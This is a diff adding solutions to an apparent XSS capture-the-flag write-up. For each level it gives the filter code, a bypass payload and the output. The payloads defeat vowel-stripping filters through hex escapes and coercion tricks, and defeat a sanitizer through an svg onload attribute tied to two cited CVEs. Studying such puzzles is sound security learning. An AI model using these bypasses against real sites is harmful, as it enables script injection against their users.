@@ -571,7 +571,7 @@ Output
 
 
 <a name="a020"/></a>
-### K'Z'K
+### K'Z'K (60)
 ```javascript
 // submitted by Stephen Leppik
 function escape(s) {
@@ -590,21 +590,100 @@ Output
 ```
 
 <a name="a021"/></a>
-### K'Z'K
+### K'Z'K (84)
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels and escape sequences in honor of K'Z'K 
+    // y is only sometimes a vowel, so it's only removed as a literal
+    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+payload
+```html
+"|[]["p\\x6fx6fp"]["c\\x6fx6fnstr\\x75x75ct\\x6fx6fr"]('\\x61x61l\\x65x65rt(1)')()|"
+```
+Output
+```html
+<script>console.log(""|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"");</script>
+```
 
 <a name="a022"/></a>
-### K'Z'K
+### K'Z'K (189)
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>\\]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+payload
+```html
+"|[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()|"
+```
+Output
+```html
+<script>console.log(""|[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()|"");</script>
+```
 
 <a name="a023"/></a>
 ### Fruit(23)
+```javascript
+// CVE-2016-4618
+function escape(s) {
+  var div = document.implementation.createHTMLDocument().createElement('div');
+  div.innerHTML = s;
+  function f(n) {
+    if ('SCRIPT' === n.tagName) n.parentNode.removeChild(n);
+    for (var i=0; i<n.attributes.length; i++) {
+      var name = n.attributes[i].name;
+      if (name !== 'class') { n.removeAttribute(name); }
+    }
+  }
+  [].map.call(div.querySelectorAll('*'), f);
+  return div.innerHTML;
+}
+```
+payload Firefox 52.6.0
 ```html
 <svg t onload=alert(1)>
+```
+Output
+```html
+<svg onload="alert(1)"></svg>
 ```
 
 <a name="a024"/></a>
 ### Fruit 2 （23）
+```javascript
+// CVE-2016-7650
+function escape(s) {
+  var div = document.implementation.createHTMLDocument().createElement('div');
+  div.innerHTML = s;
+  function f(n) {
+    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
+    for (var i=0; i<n.attributes.length; i++) {
+      var name = n.attributes[i].name;
+      if (name !== 'class') { n.removeAttribute(name); }
+    }
+  }
+  [].map.call(div.querySelectorAll('*'), f);
+  return div.innerHTML;
+}
+```
+payload
 ```html
 <svg t onload=alert(1)>
+```
+Output
+```html
+<svg onload="alert(1)"></svg>
 ```
 
 
